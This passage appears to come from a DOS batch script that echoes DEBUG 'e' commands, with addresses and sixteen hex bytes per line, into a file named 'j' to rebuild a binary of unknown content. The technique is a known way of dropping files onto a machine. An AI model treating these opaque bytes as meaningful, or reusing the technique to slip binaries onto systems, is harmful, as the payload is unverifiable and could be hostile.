echo e 3FF0 7D EB 4E EA DD 66 87 CB 90 75 15 5E DA D9 34 F8>>j
echo e 4000 CA C6 3A D6 52 56 E8 13 82 86 EC BF 23 03 03 F7>>j
echo e 4010 C0 35 C9 DD AE C9 37 81 8C 9A E8 ED 0B BD AC 9E>>j
echo e 4020 60 C3 73 59 30 44 27 BF 54 71 95 19 E2 B2 5A BB>>j
echo e 4030 23 35 7B 59 16 7C 3C C4 99 BE 95 6A D2 6D F7 72>>j
echo e 4040 27 A1 AB 50 DA C3 64 AE 54 00 1A B3 AC C8 4D 42>>j
echo e 4050 62 4F 52 6B 64 9A 69 0D E9 A1 B1 0B 06 66 1E 87>>j
echo e 4060 15 0E B9 7C 96 5A 7C 2E 7F BD 56 ED 63 8D B2 C7>>j
echo e 4070 A1 39 35 83 E3 B2 45 AD AA A2 FC A4 F6 AE DA 2A>>j
echo e 4080 F2 48 A5 A4 6E 8E 0F C4 D7 02 F7 5C 32 2B 9F 9A>>j
echo e 4090 31 C7 E7 5C 53 02 2F 26 50 7F 88 D6 FE AC EF 16>>j
echo e 40A0 A7 9C 60 84 1F D6 B3 A3 B4 8E 58 A7 98 9F DE 13>>j
echo e 40B0 91 F8 9A DB 11 45 A5 74 3A 69 CF 44 53 69 0B 44>>j
echo e 40C0 10 E2 AB 90 01 AB 7F 67 65 8F E6 04 73 8A 16 04>>j
echo e 40D0 69 4A 93 DA BC E5 D8 E8 78 77 1D CA 9B 80 15 22>>j
echo e 40E0 8D EB C5 46 F1 FC E4 0E C6 A5 8C ED 52 29 33 07>>j
echo e 40F0 6B E8 11 E5 5B 8A 95 94 8C 9E B9 A4 18 51 D3 93>>j
echo e 4100 52 A0 CA F3 53 71 36 44 A4 16 00 55 C5 FF 00 57>>j
echo e 4110 8A 8A 28 37 4B 8F 5A B8 B6 B8 F9 4E 48 AD 28 AB>>j
echo e 4120 B3 29 5A E8 55 21 6D 46 DC 55 BB 5B B3 24 61 08>>j
echo e 4130 E9 52 43 67 1A D9 93 8C 9C 55 2E 6D C9 0A 31 5D>>j
echo e 4140 91 DE C3 92 B9 AB 1A 03 89 47 63 CD 43 7C 44 92>>j
echo e 4150 96 C6 38 E2 A2 86 ED 95 36 E4 73 53 2B 0B A6 01>>j
echo e 4160 B8 C9 03 35 CF 5A 16 77 1D 3C 34 AC DA 26 B6 C1>>j
echo e 4170 D3 64 0C BC F6 AA 69 09 DD 93 EB 5B C6 DC 26 9E>>j
echo e 4180 E0 27 CE 00 AC AE 50 64 AD 71 E2 14 96 DB 13 88>>j
echo e 4190 A6 E2 BD E7 A9 34 20 05 C5 4F 04 C8 8F F3 03 8A>>j
echo e 41A0 A5 E6 64 FA 66 A4 2D 84 C1 EB 5C 12 5E F1 C2 93>>j
echo e 41B0 B6 A4 D3 10 D9 20 66 A1 04 82 08 04 54 D0 C8 8C>>j
echo e 41C0 B8 27 9A 49 18 2F 00 55 53 4D 4A C5 C5 D9 D8 B9>>j
echo e 41D0 63 71 2B EA 0A 09 ED 8A B3 74 FB 63 2A EF 95 2D>>j
echo e 41E0 8A C8 8E E5 E0 9F CC 0B CD 02 EF CE 85 83 1F 98>>j
echo e 41F0 36 6B EA B0 4B 4D 4B 92 BC 5B 66 B5 AA A2 3D B8>>j
echo e 4200 12 E3 E6 CD 7A 1D BD F4 42 54 89 39 27 B9 AF 33>>j
echo e 4210 58 CB 49 6F 22 FD DC E0 D7 6B 01 22 45 7C 6D 0A>>j
echo e 4220 2A F1 B4 9D 93 2F 0F 17 2D 0E 8A EA ED 3E CA 72>>j
echo e 4230 C3 83 45 BB AB A2 B3 02 41 AE 72 79 BC D6 6E 71>>j
echo e 4240 E9 5A 96 D7 41 6C D0 03 96 C5 78 91 5A D8 EF F6>>j
echo e 4250 2D 6A D8 BA F8 12 58 48 8A DC 63 18 15 E5 1E 25>>j
echo e 4260 8C 45 14 2E A7 E5 19 AF 4E BA 90 C9 0B 67 1B 4D>>j
echo e 4270 71 9E 2E B0 B6 8F 45 52 0E 1F 39 15 4D D9 98 4B>>j
echo e 4280 49 AB 1C C5 84 82 65 76 C1 F9 86 0D 53 93 4F DC>>j
echo e 4290 8E EA 7A 13 9A 8E CE E1 ED 18 1C FC B5 60 DC 16>>j
echo e 42A0 B7 62 30 79 26 A6 D7 77 2A 3B 99 AF 0B 22 F5 A8>>j
echo e 42B0 C8 2B F7 AA F4 46 39 C6 1B 20 8A 4B 98 77 26 40>>j
echo e 42C0 3C 74 22 B5 A6 B5 B8 A4 B5 33 0F 5C D3 8C D9 20>>j
echo e 42D0 0E D4 C6 CE FD B4 E4 51 E6 61 85 74 5A E5 D8 54>>j
echo e 42E0 9B 1C 1E 82 AC 24 80 F6 EB 55 5D 76 B7 CA 2A 7B>>j
echo e 42F0 68 9E 49 E3 50 0F CC 40 E9 58 D4 8D 9E A3 54 AF>>j
echo e 4300 72 D6 4C 8E 0E 71 8A 93 C8 57 04 E7 A5 6B 6A BA>>j
echo e 4310 6C 56 56 CA 63 19 7C 0C D6 74 10 87 8D 8E 48 6F>>j
echo e 4320 4A E5 9D 37 7D 08 9D 25 15 76 CC 49 C7 97 33 01>>j
echo e 4330 DA 91 24 C3 02 69 D3 29 17 0C 5B D6 98 0A EE 3C>>j
echo e 4340 55 5B A0 FA 13 07 05 4E 2A 58 C0 09 EE 6A BA 8C>>j
echo e 4350 A9 20 54 BF 37 96 30 0D 43 44 96 56 C8 24 81 B7>>j
echo e 4360 64 9E D5 66 DD 36 B9 22 99 6E 1A 4B 84 52 0E 0D>>j
echo e 4370 49 26 E8 65 C5 7B 38 34 B9 6F 23 2B 37 7B 9B 16>>j
echo e 4380 EE DF 66 52 0F AF F3 A6 6A 16 C5 AC 19 F3 D3 AD>>j
echo e 4390 56 82 76 11 85 CF 15 6A E2 76 92 C1 A3 C6 33 D4>>j
echo e 43A0 D7 65 6A 2E A5 3B AE 84 C2 84 EA 35 CB D0 E3 EE>>j
echo e 43B0 61 54 01 81 EB 55 24 E9 5A D7 D1 24 68 A7 AF AD>>j
echo e 43C0 64 CF 8C F1 D2 BC 14 9A 76 67 7C A8 BA 6E CC B5>>j
echo e 43D0 A4 30 5D 4A 02 4E 00 60 6B B2 BC BE 5D 4A E9 AD>>j
echo e 43E0 80 2A 54 9E 7A E4 57 05 6F 21 86 64 90 75 07 35>>j
echo e 43F0 B7 A5 5E BC BA 8B C8 DD 5B 3C 54 D5 8E 97 39 31>>j
echo e 4400 14 EE B9 96 E7 57 63 37 D9 E3 F2 7A 81 57 2F A2>>j
echo e 4410 61 A6 4D 22 FF 00 12 67 15 3E 8F 61 15 C5 97 9A>>j
echo e 4420 EA 4B 93 57 35 0B 66 5D 2A 70 8B C8 53 8E 2B 9E>>j
echo e 4430 94 A5 D5 98 50 9B BD 99 E3 32 B9 24 A9 EC 68 8C>>j
echo e 4440 70 5B 3D 28 99 1C 48 C4 A9 EB 4E 80 29 CE EA EE>>j
echo e 4450 8A BE 87 A0 F6 22 6E A6 9B 52 CD B7 7F CB D2 A2>>j
echo e 4460 A6 D5 9D 81 0E 0C 40 C5 4A C4 98 C0 F5 A8 80 C8>>j
echo e 4470 A9 80 01 57 9A 96 8A 51 B9 09 39 35 62 DA DF CD>>j
echo e 4480 C9 CE 00 A8 55 77 48 07 A9 A9 7C D3 11 2A BD E8>>j
echo e 4490 7B 68 4B 5A 13 BC 5E 5E 00 39 35 04 B1 B2 9C FA>>j
echo e 44A0 D4 82 43 B0 12 79 34 93 3F CB 9F 4A CD 5E E2 5A>>j
echo e 44B0 17 34 84 0C B2 64 F3 C7 F5 AE 92 CE F2 38 AD C2>>j
echo e 44C0 15 07 04 D7 21 69 37 97 BB 9C 67 15 B3 6E 73 0A>>j
echo e 44D0 9C E7 39 AC 2B 42 F2 B9 9C 96 A7 A6 78 6A E9 5E>>j
echo e 44E0 DA 57 91 F8 56 F5 AE 8E DE 68 FC BD C4 0F AD 70>>j
echo e 44F0 FE 0B 80 DD 5A 4E A4 F4 6E 6B B9 8A D4 0B 35 00>>j
echo e 4500 63 1D 6B D3 C4 43 DE B1 D3 56 4A 12 E5 19 2D CA>>j
echo e 4510 34 A1 38 CE 33 49 B9 0F 24 D6 2D CB B4 17 C6 42>>j
echo e 4520 0E DE D4 DF ED 2F 31 94 0E E7 14 BD 9C 5A B3 39>>j
echo e 4530 6A 5A 52 B9 B8 D3 A0 0C BE D5 93 A7 B3 0D 57 6B>>j
echo e 4540 2E 32 0D 36 6B C1 14 DB 08 A9 AC 6E 52 5B F5 52>>j
echo e 4550 3E 60 38 AE 45 49 29 93 0B AE 85 DD 6E 46 8E 34>>j
echo e 4560 2A F8 F6 AC EB 68 67 66 12 15 38 23 83 57 75 A4>>j
echo e 4570 59 82 A9 6D A5 79 A6 DA EA 2A B1 A4 3D 48 C2 E6>>j
echo e 4580 A9 24 E4 53 5A 9A A9 19 FB 03 60 E1 80 15 87 E2>>j
echo e 4590 4B 94 B5 D2 61 79 FE 72 1B 80 4D 6F 48 E2 3D 39>>j
echo e 45A0 A4 3D 38 AE 33 C6 2D F6 AB 2B 42 0E 00 27 8A ED>>j
echo e 45B0 84 6F 1D 09 95 E2 8E 33 5E BD 82 7B E0 C8 98 DD>>j
echo e 45C0 12 E6 A8 D8 41 25 C4 98 45 F9 73 50 5F C4 45 EB>>j
echo e 45D0 26 FE 00 AD 3D 1E 41 0D B9 24 F4 24 57 5D 49 5A>>j
echo e 45E0 2A 09 1D 34 17 2A 72 0D 6E DC DB E9 71 9D A3 97>>j
echo e 45F0 3F 9E 2B 9E 20 A3 A3 E4 F2 2B AC D4 53 FB 46 C6>>j
echo e 4600 1C 1C 2A B9 E3 D6 B2 AE 74 D1 1B 81 BF 25 45 70>>j
echo e 4610 D2 A3 76 DB 2E 58 84 E2 D3 DC C3 60 77 93 8E F4>>j
echo e 4620 99 AB 93 DB 94 89 9C 9C D5 31 D7 9A C6 AC 17 43>>j
echo e 4630 99 6D 72 CC 78 65 E7 AD 4C 9B B8 50 3B D5 51 C7>>j
echo e 4640 4A 96 2B 8D AD CF 35 83 4B 96 EB 71 2D 4B 4D FB>>j
echo e 4650 B7 CF 4A BF A7 C8 1C 3E 4E 72 6B 22 66 F3 B9 03>>j
echo e 4660 E6 AB 16 93 88 14 A9 EF 5D 18 7A 76 F7 88 54 F9>>j
echo e 4670 B7 36 3C E3 6A DB DF 94 7E 00 AA 93 CA B7 11 92>>j
echo e 4680 B8 04 1A 73 93 71 68 A3 3D 7A 54 30 DB A2 A9 25>>j
echo e 4690 85 74 C6 0D B6 D1 69 2E 6B 10 FD DC 64 D5 A8 66>>j
echo e 46A0 18 40 A7 9D C2 AA CA 10 2A 92 DD 73 52 C3 B0 6D>>j
echo e 46B0 DA 73 8A C2 AA BA 46 EE AF 25 91 D3 A5 C1 31 9C>>j
echo e 46C0 BE 38 15 05 C4 4F 2E DF 28 82 4D 67 B4 C6 30 08>>j
echo e 46D0 3C 1A BD 61 72 CF 20 C0 E4 63 15 A7 2C 24 B9 64>>j
echo e 46E0 63 5B 96 A4 93 28 98 A4 8E E3 CA 94 6D 22 A4 91>>j
echo e 46F0 7E 7C 0E 82 B5 2E 2C 44 B3 BD C3 BE 1B 19 0B 58>>j
echo e 4700 EF 27 CE D9 EA 0F 4A F3 E5 87 8C 6A 6A 72 CA 29>>j
echo e 4710 BB 44 9D 10 29 06 A5 76 56 8F 3D EA 9B C8 C2 30>>j
echo e 4720 49 C5 48 89 BE 34 DC 48 CD 65 4E 8A 9D 5E 52 7D>>j
echo e 4730 95 DE A4 A6 E1 5E 45 50 05 65 CF 2B 47 23 E0 11>>j
echo e 4740 EF 5A 5F 67 54 93 CC DD D0 74 AC CB B6 DF 90 A3>>j
echo e 4750 BD 7B F5 29 BA 30 49 33 78 53 4A 3A 9B 3A 4D E1>>j
echo e 4760 10 C2 AC 72 C5 BA 9A F4 36 4D DB 54 1C 66 BC DB>>j
echo e 4770 4F 80 2D AC 24 9F 9C 1A F4 3B 3B F8 E5 BB 48 8A>>j
echo e 4780 F3 80 2A EA B9 3A 68 DE 8C 79 6E EC 2C 96 45 94>>j
echo e 4790 FC D8 20 D0 C8 52 3C 23 93 81 CD 5C BD 65 45 0A>>j
echo e 47A0 AB C9 EF 9A A7 18 91 62 91 B3 9C 8E 95 E7 42 9D>>j
echo e 47B0 DB 65 3A CB 60 90 A2 E9 0C C4 92 D9 CF 5A E2 BC>>j
echo e 47C0 5D 39 9E CA 12 0E 54 1A E9 6F 6E 01 D2 58 85 20>>j
echo e 47D0 8C E6 B8 1D 4E F9 AE 15 14 9E 33 4E BD 28 A5 A1>>j
echo e 47E0 CB 1B 4D F3 19 8C A7 1C 52 C0 41 C8 6E 94 F7 DB>>j
echo e 47F0 2C 87 61 C7 14 D2 A1 23 04 9E F5 CC E3 15 1F 33>>j
echo e 4800 4B D9 D8 81 B7 24 84 0F BB 57 12 53 0D B3 2B 9C>>j
echo e 4810 86 E9 50 3E 18 8C 1E 95 0C D2 6F 65 5C D7 45 0A>>j
echo e 4820 6A D7 1C 63 7D 06 2A E6 7D CC 38 CF 5A 59 B0 CD>>j
echo e 4830 F2 8E 05 6B 43 A7 09 A3 8F E6 1C 81 4B 26 8D E4>>j
echo e 4840 12 C6 4F 94 76 AD 5C 12 9E AF 42 D7 C5 63 1A 35>>j
echo e 4850 3C 64 77 AE 92 D3 CB 4F 20 15 1B B0 33 59 5F 64>>j
echo e 4860 29 28 05 C7 A8 AB 42 42 AC A4 1E 41 14 EB 42 2E>>j
echo e 4870 3E E9 AD 4A 8A 9A 5A 68 74 B7 16 CF 34 C5 D9 43>>j
echo e 4880 44 46 4E 6B 2B 56 58 A3 99 16 25 0B 95 EC 3E B5>>j
echo e 4890 A3 1E A4 44 4B 01 FF 00 96 82 B0 F5 AB 80 2F 23>>j
echo e 48A0 8C 1F B8 B8 27 F3 A2 10 83 4A E7 3D 59 29 BB 18>>j
echo e 48B0 B3 42 CE EF 8A CF 51 87 3D EB 69 63 2E B2 1C FB>>j
echo e 48C0 D6 28 3B 64 3D EB 8E A5 3E 59 B5 D0 16 D6 27 85>>j
echo e 48D0 B6 E7 3C 56 A0 45 68 10 A8 AC A6 5F 7E A2 B4 6D>>j
echo e 48E0 D8 AC 28 3A D6 3E CF 9E 69 11 24 EC AC 5C 84 6D>>j
echo e 48F0 95 5B B0 A8 EE 98 CA 72 83 A5 49 17 CC 76 9E A6>>j
echo e 4900 9D E5 6D 26 BE 81 61 BD 9D 07 67 A8 F9 14 61 77>>j
echo e 4910 B9 14 52 00 A0 11 CD 6C DC 32 BE 91 94 03 35 91>>j
echo e 4920 E5 02 E4 F7 AB 51 CE 0D BB 42 73 CF 15 BD 35 2F>>j
echo e 4930 64 93 EC 76 60 E3 64 E7 D8 C2 D5 32 63 42 0F 02>>j
echo e 4940 B1 A5 39 6C 0A DD D6 2D 9A DA 2D AC 7A F2 2B 9F>>j
echo e 4950 63 93 5E 1D 48 F2 CD A0 9D 67 52 4D B0 5E 5A B4>>j
echo e 4960 F4 77 09 78 49 38 E2 B3 14 E0 E6 AE 58 C4 D3 DC>>j
echo e 4970 10 0E 38 35 32 8A 71 66 15 16 8E E7 B6 78 33 CB>>j
echo e 4980 9B 44 DC 30 DF 39 E7 F2 AD 8B DB 60 6C E6 01 40>>j
echo e 4990 05 09 FD 2B 90 F0 35 FA 58 68 A2 19 1B 25 A4 62>>j
echo e 49A0 3F 21 5D 9D C4 86 7D 19 A5 4E 0B A6 3F 31 5C EA>>j
echo e 49B0 9C 54 74 38 E3 04 E5 A1 E1 1A A0 C2 CE A1 46 55>>j
echo e 49C0 CE 71 58 B1 30 07 06 BB 2D 7B 46 FB 06 97 34 A5>>j
echo e 49D0 CB 3B 31 2C 6B 8A 03 26 B6 A6 AC 76 41 68 3A 4C>>j
echo e 49E0 13 91 D3 A5 35 B1 B7 A5 29 38 1B 7D E9 CC B9 40>>j
echo e 49F0 73 DA AF 56 CB 23 A9 80 1E 56 49 E4 F4 15 0F 7A>>j
echo e 4A00 94 C8 06 CE 3A 52 B5 CA 4E C0 23 64 39 22 9C 8A>>j
echo e 4A10 24 52 49 E7 34 F9 6E 3C D1 B7 14 90 28 28 D9 AD>>j
echo e 4A20 39 55 D5 85 36 BA 0C 68 DF 6E E1 F7 41 A7 B8 DF>>j
echo e 4A30 80 0F 38 AB 48 B8 80 03 DB 35 4B 77 97 21 CD 65>>j
echo e 4A40 28 DA 56 21 3B EC 46 11 F3 C0 35 D1 E9 EA 45 9A>>j
echo e 4A50 02 39 E6 A9 E9 50 0B 9D E4 F6 C5 6B C7 08 8D 02>>j
echo e 4A60 E7 A5 73 D4 AA 93 B1 8D 59 5D 58 EA BC 1D 75 25>>j
echo e 4A70 A5 9C E7 03 3B BB D7 7D 6B 31 96 D5 18 1C 66 BC>>j
echo e 4A80 72 D2 E9 E2 86 4C 48 41 CF 63 5E 9D 63 79 1F F6>>j
echo e 4A90 74 03 7F 38 CE 73 EF 5E 96 2A AC 14 F4 D9 9D F8>>j
echo e 4AA0 8C 3C 97 BD 22 C6 B1 68 0A 02 A3 B5 67 69 7A 7C>>j
echo e 4AB0 52 BC 8F 20 E5 08 22 B7 26 02 68 F6 96 C9 23 35>>j
echo e 4AC0 5A 04 5B 70 E0 F5 35 CB 3A BD 52 39 54 19 4E E2>>j
echo e 4AD0 CA 39 64 C9 03 AD 5E B6 B3 B6 84 A4 8A 00 61 DF>>j
echo e 4AE0 BD 44 E0 12 4E 6A 8E A1 33 C4 A9 B1 88 AC 29 54>>j
echo e 4AF0 6D D9 96 A9 34 AE 4F AA 6D 96 F5 02 9C 8E F5 4D>>j
echo e 4B00 22 D9 38 2B D3 75 55 82 66 2E 77 12 4D 6A DA 00>>j
echo e 4B10 C7 2C 2B 58 2F 78 96 ED A1 A5 77 27 FC 49 58 63>>j
echo e 4B20 3D 2B 85 F1 55 D9 83 49 B5 5D 87 79 39 15 DF 80>>j
echo e 4B30 16 D5 F2 32 2B 99 F1 8A 40 DA 75 BB 04 05 C1 FD>>j
echo e 4B40 2B 57 51 A8 58 98 C5 CB 49 2B 9E 73 69 14 77 D7>>j
echo e 4B50 65 E4 18 38 26 AB 47 75 E5 C9 2C 20 61 77 9F E7>>j
echo e 4B60 5B 90 5A 34 D7 E1 ED A3 DA 0A 63 EA 71 58 53 A9>>j
echo e 4B70 B6 BC B8 59 80 0E AE 41 1F 8D 76 CA A4 52 4D 33>>j
echo e 4B80 A1 52 94 23 6E E6 D4 52 E6 D4 67 84 07 AD 53 D4>>j
echo e 4B90 2E 51 6F 36 AB 70 45 57 B8 BA 69 2C E2 11 8E 33>>j
echo e 4BA0 CE 2B 36 56 66 B9 02 4E 08 AE 67 89 8E B6 DC C7>>j
echo e 4BB0 D8 37 A2 2F 5C 2A B5 A4 8C 08 E9 FD 6B 2B 6E 50>>j
echo e 4BC0 1C 75 A9 43 B1 2E 33 C1 E2 9F B7 68 50 45 73 54>>j
echo e 4BD0 A9 CD B2 2E 14 24 B4 64 29 8E FC 53 77 F3 C5 3A>>j
echo e 4BE0 62 37 71 C5 46 71 D7 1D 6B 36 EE 29 43 92 44 8B>>j
echo e 4BF0 23 8F C6 95 83 66 92 3E BC 52 CA DC D7 4A E6 51>>j
echo e 4C00 56 26 F7 7A 1A D6 F3 6D B5 43 9E 46 47 EB 4C 49>>j
echo e 4C10 4B CD 82 78 15 99 14 EE 08 52 4E 33 57 C2 85 90>>j
echo e 4C20 3E 78 22 AA 95 47 19 31 AA 6A 52 4D 23 56 CE D2>>j
echo e 4C30 1B 8C 89 00 C0 E4 53 9A C6 2B 79 25 DA 0F DD 24>>j
echo e 4C40 55 18 AE CC 21 81 3D 47 15 B3 6F 39 9E DC 02 03>>j
echo e 4C50 31 5E 28 A9 38 A9 17 52 95 D6 A6 17 9A E1 70 D5>>j
echo e 4C60 34 1A 83 C4 D9 03 B5 49 75 69 38 8D E4 28 40 06>>j
echo e 4C70 A8 A4 32 36 48 18 C7 35 8C AA B4 EE 91 8C 68 B6>>j
echo e 4C80 EE 91 D1 5A DE 34 D6 E5 9C 9D D8 C5 64 38 91 6E>>j
echo e 4C90 09 19 3B 89 A0 5C 3C 11 00 07 18 A6 C3 74 E1 83>>j
echo e 4CA0 B0 CE 2B 15 53 AB 46 8A 85 95 CD CB 08 A0 96 DD>>j
echo e 4CB0 CD C8 C1 1D 2A 29 1A 24 73 B3 95 1D 2A 2B 65 96>>j
echo e 4CC0 FC B1 8B B0 E4 52 49 6D 3C 2D 87 1C 1A D6 8C 7D>>j
echo e 4CD0 EE 64 66 DA 4A CD 09 6E ED 2D E6 D6 C6 CE E2 B4>>j
echo e 4CE0 4D 8D BB 5B 34 98 1B 81 E3 15 9F 63 6B 2D C5 D9>>j
echo e 4CF0 58 D0 96 AE 8B 4F D2 AE 24 B5 95 5F 03 1E B5 D3>>j
echo e 4D00 3A 95 25 0B 49 EC 09 6B 6B 15 AD 2C B1 6F 13 05>>j
echo e 4D10 EA 6B 52 49 CD BD F0 7E 01 14 F0 9E 5C 11 C4 30>>j
echo e 4D20 0A F5 AC 6D 59 C2 C8 CC 92 1D F5 D0 AB A5 4D 26>>j
echo e 4D30 CD A3 46 49 68 F7 35 AE F5 E3 24 99 56 03 14 F8>>j
echo e 4D40 75 52 D1 FC CE 07 F5 AE 2A 72 EA A0 E7 AF 5A 55>>j
echo e 4D50 9D FC B0 73 C6 31 5C B1 C4 41 DD 24 64 E8 5A 47>>j
echo e 4D60 45 A9 6A 0E D6 92 A4 4E 05 72 33 EE 38 50 33 EA>>j
echo e 4D70 6A 65 9C B7 C8 CE 4E 39 EB 44 07 7C 8D 90 2B 97>>j
echo e 4D80 11 5E 52 4A CB 60 A5 87 B6 85 38 E1 93 76 76 9A>>j
echo e 4D90 BA 90 02 A0 32 67 D6 B4 AD E3 8A 38 89 20 1A 6C>>j
echo e 4DA0 B2 79 76 AE BB 47 3D EB 3F 6C DE 8D 1A 54 A7 C8>>j
echo e 4DB0 EE 95 CC E9 ED A2 86 0C A8 E4 D6 4C 91 8D C5 B0>>j
echo e 4DC0 78 AB F7 32 14 55 E6 9A 06 F8 F0 14 64 D7 65 3E>>j
echo e 4DD0 64 91 0E 5C CA F0 45 CB 39 94 98 06 7B 01 56 75>>j
echo e 4DE0 0B 85 32 18 E3 19 18 E6 A9 43 69 32 AA 80 BF 31>>j
echo e 4DF0 3C 54 D6 F6 F7 31 5F 12 EB B8 0C D5 27 69 EA 5C>>j
echo e 4E00 22 E5 62 84 CE DE 60 04 60 85 18 CD 5C 80 42 D1>>j
echo e 4E10 44 5C E5 8B 73 51 EA 79 7B 91 F2 6D C2 81 54 E3>>j
echo e 4E20 9F 6C C1 7B 29 AA A9 59 45 17 3A 2E 4A EF 63 7F>>j
echo e 4E30 52 11 DB F9 2F 16 78 02 B1 EF 49 9A 51 33 F5 6E>>j
echo e 4E40 95 AB 33 24 B6 08 73 97 CD 67 EA 0E 3F 76 3D 16>>j
echo e 4E50 B1 75 F9 75 48 C1 51 72 77 45 40 E4 23 73 F5 AC>>j
echo e 4E60 76 1F 31 35 A3 1A B3 96 EE 0F 15 42 41 83 8C 63>>j
echo e 4E70 15 82 9B 6D B7 D4 D9 D1 71 8D D8 E4 24 E4 9E D5>>j
echo e 4E80 68 5C 95 8D 02 81 8A A7 19 03 39 A4 C9 1C 55 D2>>j
echo e 4E90 D2 77 32 BA B5 9A 3A 38 53 17 09 93 9C 8A B6 EA>>j
echo e 4EA0 A7 9A C8 B7 92 46 95 2A F7 98 CB 90 4F 5A F4 1D>>j
echo e 4EB0 6A AE 84 94 BE 41 4E 32 72 B4 95 D0 ED 9B A4 38>>j
echo e 4EC0 E0 0A 87 78 5D D8 EA 0D 4A 8D 92 47 AD 37 CB C4>>j
echo e 4ED0 8C 40 EB 8A EB A3 88 84 28 46 EF 5B 1E 85 2C 1D>>j
echo e 4EE0 55 0B C7 A9 4F 5C B8 13 D9 AE 41 0D C0 1F A5 73>>j
echo e 4EF0 58 C3 60 D7 4D AC 6D C4 40 8F F3 C5 73 D7 03 13>>j
echo e 4F00 E7 18 AF 25 D6 55 1D CE 49 52 F6 6F 97 A9 09 AD>>j
echo e 4F10 FF 00 09 5B 2D D6 A6 63 7C 63 69 EB F4 35 84 CA>>j
echo e 4F20 7A F6 AD 0D 0E 77 B6 D4 16 45 62 A4 29 FE 55 12>>j
echo e 4F30 D9 D8 97 0E 6F 75 F5 3B 68 D4 5A 48 44 5F 71 6B>>j
echo e 4F40 D1 74 BC DC 68 D6 E8 DD 1A 30 7F 4A F2 51 76 ED>>j
echo e 4F50 18 62 E4 E5 AB D5 34 2B C8 4E 97 68 9B 86 F1 12>>j
echo e 4F60 F1 F8 56 12 AC E5 64 CC 27 87 74 24 9A D5 18 BE>>j
echo e 4F70 35 F0 FC 12 68 A1 43 15 2A 73 9F 5E 2B C5 A6 88>>j
echo e 4F80 C1 33 2F A1 E2 BD DF C7 B7 46 1F 0E 4A E9 D7 A0>>j
echo e 4F90 AF 10 96 41 71 3A 16 18 C2 E2 BA E2 AE B4 34 52>>j
echo e 4FA0 BE A8 AA 06 E3 C5 4F 24 6A B0 E7 3C F4 15 3A 47>>j
echo e 4FB0 B2 39 08 40 57 B1 AA 25 C9 18 CF 19 A5 AC 5E A5>>j
echo e 4FC0 DB A8 CA 3A 9A 0F 5A 29 00 F0 84 49 81 C9 AD 24>>j
echo e 4FD0 85 56 3E 3A D5 08 CB 7D EE F5 72 27 01 4E F6 A5>>j
echo e 4FE0 ED 39 35 48 3D 93 91 33 80 B1 71 59 72 9C B1 AB>>j
echo e 4FF0 EE C4 C7 C7 35 47 CB 25 F9 A8 8C 9B 6D B2 BD 95>>j
echo e 5000 91 72 CA E9 ED 54 15 FE 2E B5 77 FB 41 9B 93 D6>>j
echo e 5010 B2 49 01 40 5F 5A 95 22 91 97 22 B3 95 35 27 72>>j
echo e 5020 6E 96 E8 D9 DC 3C 86 FE F6 6B A4 B1 D4 54 C1 67>>j
echo e 5030 1F 20 E7 A9 E9 D4 D7 37 B7 72 12 01 AE 9A 1B 48>>j
echo e 5040 C5 A5 BB AA 81 B4 67 1F 8D 47 2B 8B B9 EF E2 28>>j
echo e 5050 2B E9 AA 3B E8 75 10 D3 6D 28 06 00 03 DE A5 92>>j
echo e 5060 44 BB 56 D9 F7 97 8A E2 1B C4 85 2E 18 84 19 55>>j
echo e 5070 AD 9F 0E EB 26 EE 19 4B FD E0 79 AD A3 2B BB 33>>j
echo e 5080 CE A9 42 54 F5 66 CC 90 48 23 E4 E0 0E 4D 65 6A>>j
echo e 5090 2F BB 60 5E 6B 7D F7 4D 6E A5 7B 83 58 D3 D9 E2>>j
echo e 50A0 4C 10 78 34 E7 AE A8 C5 CE EA C6 6C 68 F1 30 2C>>j
echo e 50B0 3A F4 AD FD 36 1F 38 82 4F 15 0D AD 8A DC 4A 3C>>j
echo e 50C0 CF BA BD AA 58 A7 5B 6B 86 44 18 00 D2 8A 4D 5F>>j
echo e 50D0 A9 82 A6 E4 CD 73 18 31 BC 63 A6 2B 8E F1 AB FD>>j
echo e 50E0 8A D2 00 7B E6 BA BB 6B 8F 31 8A D6 37 8C 6C 92>>j
echo e 50F0 FA CE D9 1C F1 BB B5 44 B9 AC D3 2A 94 5A 7A 9C>>j
echo e 5100 DF 87 88 99 56 40 D8 EB 8F E9 58 DA AF 87 9E F7>>j
echo e 5110 52 BA 94 C8 B9 2E 4E 17 EB 57 91 D3 4C B9 FB 32>>j
echo e 5120 FC A3 B5 69 DB AA 35 BC 92 93 96 3C E6 B4 8C 3D>>j
echo e 5130 C5 AE A7 A3 38 27 0B A3 97 9B 40 7B 2B 58 D9 A4>>j
echo e 5140 1B 49 E8 6B 07 59 84 C1 74 3E 60 72 3B 76 AE BF>>j
echo e 5150 C4 53 32 E9 50 BA 72 73 83 5C A0 84 DE CE 0C 81>>j
echo e 5160 8E 46 73 59 B8 DA 57 39 D6 8A C6 6A BF A7 4A 9B>>j
echo e 5170 CD 2C B8 F4 A9 DE D6 25 56 51 9D CA 6A AA A1 57>>j
echo e 5180 F9 B8 53 5A A7 65 B1 B5 9A 49 B0 7C 13 EB 51 73>>j
echo e 5190 BB 15 3C B1 8F 33 F7 79 22 8D A0 1C 11 83 50 92>>j
echo e 51A0 4E CC E4 AE A4 DD 90 C5 60 0E 71 43 1D DC D3 84>>j
echo e 51B0 40 9E B5 2A C2 9B 72 73 44 BD DD 99 2B 0F 2E 85>>j
echo e 51C0 7C 01 CD 5A 85 FC D6 54 27 AD 31 A3 50 38 35 1C>>j
echo e 51D0 6E 23 90 11 D4 52 4E EC BF 67 CB 2D 4D 11 6F D9>>j
echo e 51E0 9B 35 3D AD D3 DB C8 8B CE 37 0C 55 7B 79 4C A0>>j
echo e 51F0 E4 F2 29 C7 78 70 40 DD 8E 69 36 D3 F2 3A 5D 38>>j
echo e 5200 C9 68 74 92 CC 2E 2D 59 49 C7 4A CF 10 05 5D DB>>j
echo e 5210 C6 0F 15 9C D7 F2 11 B4 75 EF 4D 33 B8 4C 66 AA>>j
echo e 5220 32 BE 8C C2 3E EE C5 C6 55 2D B4 9C 83 53 1B 05>>j
echo e 5230 2A 3E 60 B4 CB 28 E2 9A D8 C9 2B E1 C1 E2 94 B8>>j
echo e 5240 94 95 DD D3 DE 95 56 E4 BD CE 87 44 B9 5C 4B F6>>j
echo e 5250 24 D8 AB 6D 3F 78 53 66 BA 32 BE 58 F1 50 43 73>>j
echo e 5260 E5 82 59 73 E9 4D 67 4C 6F C7 2C 79 14 A1 69 46>>j
echo e 5270 F7 D4 F3 A3 49 CD 97 AD 2E D6 1B D8 DD 78 CF 5A>>j
